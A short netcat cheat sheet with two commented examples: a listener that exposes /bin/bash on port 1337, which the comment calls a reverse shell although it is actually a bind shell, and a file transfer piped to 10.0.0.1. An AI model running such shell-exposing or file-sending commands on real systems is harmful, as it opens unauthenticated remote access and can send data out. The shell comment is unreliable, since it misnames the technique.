# Create a bash process and connect its stdin/out to a network pipe using netcat (reverse shell)
nc -l -p 1337 -e /bin/bash

# Send file nc.sh to server and save it as data.txt
nc -l -p 8080 > data.txt        # server listener
cat nc.sh | nc 10.0.0.1 8080    # client sending file
